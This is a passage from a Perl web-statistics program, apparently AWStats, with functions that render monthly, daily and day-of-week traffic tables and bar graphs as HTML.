$ix = 1 ; $ix <= 12 ; $ix++ ) {\n\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t!$StaticLinks\n\t\t\t\t  && $monthix == $nowmonth\n\t\t\t\t  && $YearRequired == $nowyear\n\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t: ''\n\t\t\t  );\n\t\t\tprint \"$MonthNumLib{$monthix} $YearRequired\";\n\t\t\tprint(   !$StaticLinks\n\t\t\t\t  && $monthix == $nowmonth\n\t\t\t\t  && $YearRequired == $nowyear ? '</span>' : '' );\n\t\t\tprint \"</td>\";\n\t\t\tif ( $ShowMonthStats =~ /U/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($MonthUnique{ $YearRequired . $monthix }\n\t\t\t\t  ? $MonthUnique{ $YearRequired . $monthix }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /V/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($MonthVisits{ $YearRequired . $monthix }\n\t\t\t\t  ? $MonthVisits{ $YearRequired . $monthix }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /P/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($MonthPages{ $YearRequired . $monthix }\n\t\t\t\t  ? $MonthPages{ $YearRequired . $monthix }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /H/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($MonthHits{ $YearRequired . $monthix }\n\t\t\t\t  ? $MonthHits{ $YearRequired . $monthix }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowMonthStats =~ /B/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Bytes(\n\t\t\t\t\tint( $MonthBytes{ $YearRequired . $monthix } || 0 )\n\t\t\t\t  ), \"</td>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\n\t\t# Average row\n\t\t# TODO\n\t\t# Total row\n\t\tprint\n\"<tr><td bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[102]</td>\";\n\t\tif ( $ShowMonthStats =~ /U/i ) {\n\t\t\tprint\n\t\t\t  \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\".Format_Number($total_u).\"</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /V/i ) {\n\t\t\tprint\n\t\t\t  \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\".Format_Number($total_v).\"</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /P/i ) {\n\t\t\tprint\n\t\t\t  \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\".Format_Number($total_p).\"</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /H/i ) {\n\t\t\tprint\n\t\t\t  \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\".Format_Number($total_h).\"</td>\";\n\t\t}\n\t\tif ( $ShowMonthStats =~ /B/i ) {\n\t\t\tprint \"<td bgcolor=\\\"#$color_TableBGRowTitle\\\">\"\n\t\t\t  . Format_Bytes($total_k) . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n<br />\\n\";\n\t}\n\n\tprint \"</center>\\n\";\n\tprint \"</td></tr>\\n\";\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Daily section on the main page\n# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage\n#\t\t\t\t$firstdaytoshowtime, $lastdaytoshowtime\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainDaily{\n\tmy $firstdaytocountaverage = shift;\n\tmy $lastdaytocountaverage = shift;\n\tmy $firstdaytoshowtime = shift;\n\tmy $lastdaytoshowtime = shift;\n\t\n\tif ($Debug) { debug( \"ShowDaysOfMonthStats\", 2 ); }\n\tprint \"$Center<a name=\\\"daysofmonth\\\">&nbsp;</a><br />\\n\";\n\n\tmy $NewLinkParams = ${QueryString};\n\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\tmy $NewLinkTarget = '';\n\n\tif ( $FrameName eq 'mainright' ) {\n\t\t$NewLinkTarget = \" target=\\\"_parent\\\"\";\n\t}\n\n\tmy $title = \"$Message[138]\";\n\n    if ($AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n        # extend the title to include the added link\n            $title = \"$title &nbsp; - &nbsp; <a href=\\\"\".(XMLEncode(\n                \"$AddLinkToExternalCGIWrapper\". \"?section=DAY&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n\n\t&tab_head( \"$title\", 0, 0, 'daysofmonth' );\n\tprint \"<tr>\";\n\tprint \"<td align=\\\"center\\\">\\n\";\n\tprint \"<center>\\n\";\n\t\n\tmy $average_v = my $average_p = 0;\n\tmy $average_h = my $average_k = 0;\n\tmy $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;\n\tmy $max_v = my $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1\n\tforeach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t{\n\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\tmy $year  = $1;\n\t\tmy $month = $2;\n\t\tmy $day   = $3;\n\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\tnext;\n\t\t}    # If not an existing day, go to next\n\t\t$total_v += $DayVisits{ $year . $month . $day } || 0;\n\t\t$total_p += $DayPages{ $year . $month . $day }  || 0;\n\t\t$total_h += $DayHits{ $year . $month . $day }   || 0;\n\t\t$total_k += $DayBytes{ $year . $month . $day }  || 0;\n\t\tif ( ( $DayVisits{ $year . $month . $day } || 0 ) > $max_v ) {\n\t\t\t$max_v = $DayVisits{ $year . $month . $day };\n\t\t}\n\n#if (($DayPages{$year.$month.$day}||0) > $max_p)  { $max_p=$DayPages{$year.$month.$day}; }\n\t\tif ( ( $DayHits{ $year . $month . $day } || 0 ) > $max_h ) {\n\t\t\t$max_h = $DayHits{ $year . $month . $day };\n\t\t}\n\t\tif ( ( $DayBytes{ $year . $month . $day } || 0 ) > $max_k ) {\n\t\t\t$max_k = $DayBytes{ $year . $month . $day };\n\t\t}\n\t}\n    $average_v = sprintf( \"%.2f\", $AverageVisits );\n    $average_p = sprintf( \"%.2f\", $AveragePages );\n    $average_h = sprintf( \"%.2f\", $AverageHits );\n    $average_k = sprintf( \"%.2f\", $AverageBytes );\n\n\t# Show bars for day\n\tmy $graphdone=0;\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t{\n\t\tmy @blocklabel = ();\n\t\tforeach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\tmy $bold =\n\t\t\t  (      $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear ? ':' : '' );\n\t\t\tmy $weekend =\n\t\t\t  ( DayOfWeek( $day, $month, $year ) =~ /[06]/ ? '!' : '' );\n\t\t\tpush @blocklabel,\n\t\t\t  \"$day\\n$MonthNumLib{$month}$weekend$bold\";\n\t\t}\n\t\tmy @vallabel = (\n\t\t\t\"$Message[10]\", \"$Message[56]\",\n\t\t\t\"$Message[57]\", \"$Message[75]\"\n\t\t);\n\t\tmy @valcolor =\n\t\t  ( \"$color_v\", \"$color_p\", \"$color_h\", \"$color_k\" );\n\t\tmy @valmax   = ( $max_v,   $max_h,   $max_h,   $max_k );\n\t\tmy @valtotal = ( $total_v, $total_p, $total_h, $total_k );\n\t\tmy @valaverage =\n\t\t  ( $average_v, $average_p, $average_h, $average_k );\n\t\tmy @valdata = ();\n\t\tmy $xx      = 0;\n\n\t\tforeach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\t$valdata[ $xx++ ] = $DayVisits{ $year . $month . $day }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $DayPages{ $year . $month . $day } || 0;\n\t\t\t$valdata[ $xx++ ] = $DayHits{ $year . $month . $day }  || 0;\n\t\t\t$valdata[ $xx++ ] = $DayBytes{ $year . $month . $day } || 0;\n\t\t}\n\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t&$function(\n\t\t\t\"$title\",              \"daysofmonth\",\n\t\t\t$ShowDaysOfMonthStats, \\@blocklabel,\n\t\t\t\\@vallabel,            \\@valcolor,\n\t\t\t\\@valmax,              \\@valtotal,\n\t\t\t\\@valaverage,          \\@valdata\n\t\t);\n\t\t$graphdone=1;\n\t}\n\t# If graph was not printed by a plugin\n\tif (! $graphdone) {\n\t\tprint \"<table>\\n\";\n\t\tprint \"<tr valign=\\\"bottom\\\">\\n\";\n\t\tforeach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\tmy $bredde_v = 0;\n\t\t\tmy $bredde_p = 0;\n\t\t\tmy $bredde_h = 0;\n\t\t\tmy $bredde_k = 0;\n\t\t\tif ( $max_v > 0 ) {\n\t\t\t\t$bredde_v =\n\t\t\t\t  int( ( $DayVisits{ $year . $month . $day } || 0 ) /\n\t\t\t\t\t  $max_v * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_p =\n\t\t\t\t  int( ( $DayPages{ $year . $month . $day } || 0 ) /\n\t\t\t\t\t  $max_h * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_h =\n\t\t\t\t  int( ( $DayHits{ $year . $month . $day } || 0 ) /\n\t\t\t\t\t  $max_h * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_k > 0 ) {\n\t\t\t\t$bredde_k =\n\t\t\t\t  int( ( $DayBytes{ $year . $month . $day } || 0 ) /\n\t\t\t\t\t  $max_k * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tprint \"<td>\";\n\t\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vv'}\\\" height=\\\"$bredde_v\\\" width=\\\"4\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[10]: \"\n\t\t\t\t\t  . int( $DayVisits{ $year . $month . $day } || 0 )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"4\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[56]: \"\n\t\t\t\t\t  . int( $DayPages{ $year . $month . $day } || 0 ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"4\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[57]: \"\n\t\t\t\t\t  . int( $DayHits{ $year . $month . $day } || 0 ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"4\\\"\"\n\t\t\t\t  . AltTitle(\n\t\t\t\t\t\"$Message[75]: \"\n\t\t\t\t\t  . Format_Bytes(\n\t\t\t\t\t\t$DayBytes{ $year . $month . $day }\n\t\t\t\t\t  )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t\tprint \"<td>&nbsp;</td>\";\n\n\t\t# Show average value bars\n\t\tprint \"<td>\";\n\t\tmy $bredde_v = 0;\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_v > 0 ) {\n\t\t\t$bredde_v = int( $average_v / $max_v * $BarHeight ) + 1;\n\t\t}\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_p = int( $average_p / $max_h * $BarHeight ) + 1;\n\t\t}\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h = int( $average_h / $max_h * $BarHeight ) + 1;\n\t\t}\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k = int( $average_k / $max_k * $BarHeight ) + 1;\n\t\t}\n\t\t$average_v = sprintf( \"%.2f\", $average_v );\n\t\t$average_p = sprintf( \"%.2f\", $average_p );\n\t\t$average_h = sprintf( \"%.2f\", $average_h );\n\t\t$average_k = sprintf( \"%.2f\", $average_k );\n\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vv'}\\\" height=\\\"$bredde_v\\\" width=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"$Message[10]: $average_v\") . \" />\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"$Message[56]: $average_p\") . \" />\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"$Message[57]: $average_h\") . \" />\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"$Message[75]: $average_k\") . \" />\";\n\t\t}\n\t\tprint \"</td>\\n\";\n\t\tprint \"</tr>\\n\";\n\n\t\t# Show lib for day\n\t\tprint \"<tr valign=\\\"middle\\\">\";\n\t\tforeach\n\t\t  my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\tmy $dayofweekcursor = DayOfWeek( $day, $month, $year );\n\t\t\tprint \"<td\"\n\t\t\t  . (\n\t\t\t\t$dayofweekcursor =~ /[06]/\n\t\t\t\t? \" bgcolor=\\\"#$color_weekend\\\"\"\n\t\t\t\t: \"\"\n\t\t\t  )\n\t\t\t  . \">\";\n\t\t\tprint(\n\t\t\t\t!$StaticLinks\n\t\t\t\t  && $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear\n\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t: ''\n\t\t\t);\n\t\t\tprint \"$day<br /><span style=\\\"font-size: \"\n\t\t\t  . (    $FrameName ne 'mainright'\n\t\t\t\t  && $QueryString !~ /buildpdf/i ? \"9\" : \"8\" )\n\t\t\t  . \"px;\\\">\"\n\t\t\t  . $MonthNumLib{$month}\n\t\t\t  . \"</span>\";\n\t\t\tprint(   !$StaticLinks\n\t\t\t\t  && $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear ? '</span>' : '' );\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t\tprint \"<td>&nbsp;</td>\";\n\t\tprint \"<td valign=\\\"middle\\\"\"\n\t\t  . Tooltip(18)\n\t\t  . \">$Message[96]</td>\\n\";\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n\";\n\t}\n\tprint \"<br />\\n\";\n\n\t# Show data array for days\n\tif ($AddDataArrayShowDaysOfMonthStats) {\n\t\tprint \"<table>\\n\";\n\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[4]</td>\";\n\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_v\\\"\"\n\t\t\t  . Tooltip(1)\n\t\t\t  . \">$Message[10]</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t  . Tooltip(3)\n\t\t\t  . \">$Message[56]</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t  . Tooltip(4)\n\t\t\t  . \">$Message[57]</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t  . Tooltip(5)\n\t\t\t  . \">$Message[75]</td>\";\n\t\t}\n\t\tprint \"</tr>\";\n\t\tforeach\n\t\t  my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\tmy $dayofweekcursor = DayOfWeek( $day, $month, $year );\n\t\t\tprint \"<tr\"\n\t\t\t  . (\n\t\t\t\t$dayofweekcursor =~ /[06]/\n\t\t\t\t? \" bgcolor=\\\"#$color_weekend\\\"\"\n\t\t\t\t: \"\"\n\t\t\t  )\n\t\t\t  . \">\";\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t!$StaticLinks\n\t\t\t\t  && $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear\n\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t: ''\n\t\t\t  );\n\t\t\tprint Format_Date( \"$year$month$day\" . \"000000\", 2 );\n\t\t\tprint(   !$StaticLinks\n\t\t\t\t  && $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear ? '</span>' : '' );\n\t\t\tprint \"</td>\";\n\t\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($DayVisits{ $year . $month . $day }\n\t\t\t\t  ? $DayVisits{ $year . $month . $day }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($DayPages{ $year . $month . $day }\n\t\t\t\t  ? $DayPages{ $year . $month . $day }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($DayHits{ $year . $month . $day }\n\t\t\t\t  ? $DayHits{ $year . $month . $day }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Bytes(\n\t\t\t\t\tint( $DayBytes{ $year . $month . $day } || 0 ) ),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\n\t\t# Average row\n\t\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><td>$Message[96]</td>\";\n\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\tprint \"<td>\".Format_Number(int($average_v)).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\tprint \"<td>\".Format_Number(int($average_p)).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number(int($average_h)).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\tprint \"<td>\".Format_Bytes(int($average_k)).\"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t# Total row\n\t\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><td>$Message[102]</td>\";\n\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\tprint \"<td>\".Format_Number($total_v).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\tprint \"<td>\".Format_Number($total_p).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($total_h).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($total_k) . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n<br />\";\n\t}\n\n\tprint \"</center>\\n\";\n\tprint \"</td></tr>\\n\";\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Days of the Week section on the main page\n# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainDaysofWeek{\n\tmy $firstdaytocountaverage = shift;\n\tmy $lastdaytocountaverage = shift;\n    my $NewLinkParams = shift;\n    my $NewLinkTarget = shift;\t\n    \n\tif ($Debug) { debug( \"ShowDaysOfWeekStats\", 2 ); }\n\t\t\tprint \"$Center<a name=\\\"daysofweek\\\">&nbsp;</a><br />\\n\";\n\t\t\tmy $title = \"$Message[91]\";\n\t\t\t&tab_head( \"$title\", 18, 0, 'daysofweek' );\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td align=\\\"center\\\">\";\n\t\t\tprint \"<center>\\n\";\n\n\t\t\tmy $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1\n\t\t\t                        # Get average value for day of week\n\t\t\tmy @avg_dayofweek_nb = ();\n\t\t\tmy @avg_dayofweek_p  = ();\n\t\t\tmy @avg_dayofweek_h  = ();\n\t\t\tmy @avg_dayofweek_k  = ();\n\t\t\tforeach my $daycursor (\n\t\t\t\t$firstdaytocountaverage .. $lastdaytocountaverage )\n\t\t\t{\n\t\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\t\tmy $year  = $1;\n\t\t\t\tmy $month = $2;\n\t\t\t\tmy $day   = $3;\n\t\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\t\tnext;\n\t\t\t\t}    # If not an existing day, go to next\n\t\t\t\tmy $dayofweekcursor = DayOfWeek( $day, $month, $year );\n\t\t\t\t$avg_dayofweek_nb[$dayofweekcursor]\n\t\t\t\t  ++; # Increase number of day used to count for this day of week\n\t\t\t\t$avg_dayofweek_p[$dayofweekcursor] +=\n\t\t\t\t  ( $DayPages{$daycursor} || 0 );\n\t\t\t\t$avg_dayofweek_h[$dayofweekcursor] +=\n\t\t\t\t  ( $DayHits{$daycursor} || 0 );\n\t\t\t\t$avg_dayofweek_k[$dayofweekcursor] +=\n\t\t\t\t  ( $DayBytes{$daycursor} || 0 );\n\t\t\t}\n\t\t\tfor (@DOWIndex) {\n\t\t\t\tif ( $avg_dayofweek_nb[$_] ) {\n\t\t\t\t\t$avg_dayofweek_p[$_] =\n\t\t\t\t\t  $avg_dayofweek_p[$_] / $avg_dayofweek_nb[$_];\n\t\t\t\t\t$avg_dayofweek_h[$_] =\n\t\t\t\t\t  $avg_dayofweek_h[$_] / $avg_dayofweek_nb[$_];\n\t\t\t\t\t$avg_dayofweek_k[$_] =\n\t\t\t\t\t  $avg_dayofweek_k[$_] / $avg_dayofweek_nb[$_];\n\n\t\t  #if ($avg_dayofweek_p[$_] > $max_p) { $max_p = $avg_dayofweek_p[$_]; }\n\t\t\t\t\tif ( $avg_dayofweek_h[$_] > $max_h ) {\n\t\t\t\t\t\t$max_h = $avg_dayofweek_h[$_];\n\t\t\t\t\t}\n\t\t\t\t\tif ( $avg_dayofweek_k[$_] > $max_k ) {\n\t\t\t\t\t\t$max_k = $avg_dayofweek_k[$_];\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\t$avg_dayofweek_p[$_] = \"?\";\n\t\t\t\t\t$avg_dayofweek_h[$_] = \"?\";\n\t\t\t\t\t$avg_dayofweek_k[$_] = \"?\";\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Show bars for days of week\n\t\t\tmy $graphdone=0;\n\t\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t\t{\n\t\t\t\tmy @blocklabel = ();\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\tpush @blocklabel,\n\t\t\t\t\t  ( $Message[ $_ + 84 ] . ( $_ =~ /[06]/ ? \"!\" : \"\" ) );\n\t\t\t\t}\n\t\t\t\tmy @vallabel =\n\t\t\t\t  ( \"$Message[56]\", \"$Message[57]\", \"$Message[75]\" );\n\t\t\t\tmy @valcolor = ( \"$color_p\", \"$color_h\", \"$color_k\" );\n\t\t\t\tmy @valmax = ( int($max_h), int($max_h), int($max_k) );\n\t\t\t\tmy @valtotal = ( $TotalPages, $TotalHits, $TotalBytes );\n\t\t\t\t# TEMP\n\t\t\t\tmy $average_p = my $average_h = my $average_k = 0;\n\t\t\t\t$average_p = sprintf( \"%.2f\", $AveragePages );\n\t\t\t\t$average_h = sprintf( \"%.2f\", $AverageHits );\n\t\t\t\t$average_k = (\n\t\t\t\t\tint($average_k)\n\t\t\t\t\t? Format_Bytes( sprintf( \"%.2f\", $AverageBytes ) )\n\t\t\t\t\t: \"0.00\"\n\t\t\t\t);\n\t\t\t\tmy @valaverage = ( $average_p, $average_h, $average_k );\n\t\t\t\tmy @valdata    = ();\n\t\t\t\tmy $xx         = 0;\n\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\t$valdata[ $xx++ ] = $avg_dayofweek_p[$_] || 0;\n\t\t\t\t\t$valdata[ $xx++ ] = $avg_dayofweek_h[$_] || 0;\n\t\t\t\t\t$valdata[ $xx++ ] = $avg_dayofweek_k[$_] || 0;\n\n\t\t\t\t\t# Round to be ready to show array\n\t\t\t\t\t$avg_dayofweek_p[$_] =\n\t\t\t\t\t  sprintf( \"%.2f\", $avg_dayofweek_p[$_] );\n\t\t\t\t\t$avg_dayofweek_h[$_] =\n\t\t\t\t\t  sprintf( \"%.2f\", $avg_dayofweek_h[$_] );\n\t\t\t\t\t$avg_dayofweek_k[$_] =\n\t\t\t\t\t  sprintf( \"%.2f\", $avg_dayofweek_k[$_] );\n\n\t\t\t\t\t# Remove decimal part that are .0\n\t\t\t\t\tif ( $avg_dayofweek_p[$_] == int( 